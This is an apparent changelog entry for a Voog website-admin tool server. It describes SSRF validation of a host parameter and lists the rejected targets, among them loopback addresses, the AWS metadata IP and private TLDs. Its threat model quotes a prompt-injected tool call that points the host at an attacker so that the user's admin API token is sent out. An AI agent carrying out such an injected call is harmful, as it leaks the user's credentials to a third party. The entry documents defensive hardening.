...
- **Phase 3 admin wrappers (S5, S6, S12, S13, MD5, MD6, N5):**
  ...
  - **Security hardening (PR #125 review):** `voog_list_my_sites` `host` parameter is now validated against an SSRF-defensive ruleset before constructing the VoogClient — rejects localhost / loopback, raw IPv4 / IPv6 (including AWS metadata IP 169.254.169.254), explicit ports, URL schemes / userinfo / paths, private TLDs (`.local`, `.internal`, `.intranet`, `.onion`, `.test`, `.example`, …), and IDN homograph attacks. NOT a `*.voog.com` allowlist — tenants legitimately host the admin API on their own primary domain (Stella uses `stellasoomlais.com`), so a domain allowlist would reject real-world setups. Threat model: prompt-injected `voog_list_my_sites(host="attacker", token_env="VOOG_API_KEY")` would otherwise ship the user's full-admin token as `X-API-Token` to a third party.
